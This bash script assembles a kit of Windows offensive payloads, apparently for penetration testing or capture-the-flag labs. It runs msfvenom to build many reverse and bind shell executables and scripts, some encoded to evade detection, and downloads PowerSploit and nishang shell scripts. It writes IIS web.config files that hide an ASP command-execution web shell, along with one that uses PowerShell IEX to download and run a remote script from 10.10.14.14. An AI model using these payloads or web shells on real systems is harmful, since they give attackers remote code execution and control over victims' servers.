mkdir payloads_windows
cd payloads_windows

  wget -Nq https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1
  wget -Nq https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

  # Reverse shells
  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x86.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -o shell_reverse_tcp_x64.exe

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.exe
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_reverse_tcp_x64_shikata_ga_nai.exe

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x86.asp
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f asp > shell_reverse_tcp_x64.asp

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x86.js_le
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f js_le > shell_reverse_tcp_x64.js_le

  msfvenom -p windows/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x86.python
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ip_local LPORT=$port_local EXITFUNC=thread -f python > shell_reverse_tcp_x64.python

  msfvenom -p windows/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --format raw -e x86/shikata_ga_nai -o shell_reverse_tcp_x86_shikata_ga_nai.bin
  msfvenom -p windows/x64/shell_reverse_tcp LPORT=$port_local LHOST=$ip_local EXITFUNC=thread --format raw -o shell_reverse_tcp_x64_shikata_ga_nai.bin    
    
  # Bind shells
  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -o shell_bind_tcp_x86.exe
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -o shell_bind_tcp_x64.exe

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.exe
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f exe -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.exe

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x86.asp
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f asp > shell_bind_tcp_x64.asp

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x86.js_le
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f js_le > shell_bind_tcp_x64.js_le

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x86.python
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote EXITFUNC=thread -f python > shell_bind_tcp_x64.python

  msfvenom -p windows/shell_bind_tcp LPORT=$port_remote --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x86_shikata_ga_nai.bin
  msfvenom -p windows/x64/shell_bind_tcp LPORT=$port_remote --format raw -e x86/shikata_ga_nai -o shell_bind_tcp_x64_shikata_ga_nai.bin


cat <<\EOT >asptest.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Response.write("-"&"->")
' it is running the ASP code if you can see 3 by opening the web.config file!
Response.write(1+2)
Response.write("<!-"&"-")
%>
-->
EOT

cat <<\EOT >aspcmd.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set oScript = Server.CreateObject("WScript.Shell")
Set oScriptNet = Server.CreateObject("WScript.Network")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

Function getCommandOutput(theCommand)
    Dim objShell, objCmdExec
    Set objShell = CreateObject("WScript.Shell")
    Set objCmdExec = objshell.exec(thecommand)

    getCommandOutput = objCmdExec.StdOut.ReadAll
end Function
%>

<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="<%= szCMD %>">
<input type="submit" value="Run">
</FORM>

<PRE>
<%= "\\" & oScriptNet.ComputerName & "\" & oScriptNet.UserName %>
<% Response.Write(Request.ServerVariables("SERVER_NAME")) %>
<p>
<b>The server's local address:</b>
<% Response.Write(Request.ServerVariables("LOCAL_ADDR")) %>
</p>
<p>
<b>The server's port:</b>
<% Response.Write(Request.ServerVariables("SERVER_PORT")) %>
</p>
<p>
<b>The server's software:</b>
<% Response.Write(Request.ServerVariables("SERVER_SOFTWARE")) %>
</p>
<p>
<b>Command output:</b>
<%
szCMD = request("cmd")
thisDir = getCommandOutput("cmd /c" & szCMD)
Response.Write(thisDir)
%>
</p>
<br>
</BODY>

<% Response.write("<!-"&"-") %>
-->
EOT


cat <<\EOT >asppower.asp.config
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<% Response.write("-"&"->") %>

<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.14:8881/sh3ll.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>

<% Response.write("<!-"&"-") %>
-->
EOT

  git clone --depth=1 --recursive https://github.com/infoskirmish/Window-Tools.git
  mv Window-Tools/* .
  rm -rf .git
  rm -rf Window-Tools
  
  # Create all common shells in payloads_windows folder
  bash ../_setup/setup_payloads.sh

cd -
